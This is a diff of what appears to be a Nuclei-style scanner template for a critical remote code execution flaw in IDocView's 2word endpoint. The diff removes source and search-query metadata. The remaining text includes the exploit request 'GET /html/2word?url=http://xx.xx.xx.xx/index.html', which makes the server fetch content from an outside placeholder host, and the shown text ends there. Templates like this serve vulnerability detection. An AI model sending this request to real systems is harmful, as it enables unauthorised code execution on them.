@@ -3,14 +3,8 @@ info:
   name: IDocView在线文档预览系统2word存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d5203c7ae074ff302e70adcbcc8a59e9
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: d5203c7ae074ff302e70adcbcc8a59e9
-    fofa: + hunter`app.name="I Doc View"`
 http:
 - raw:
   - 'GET /html/2word?url=http://xx.xx.xx.xx/index.html HTTP/1.1
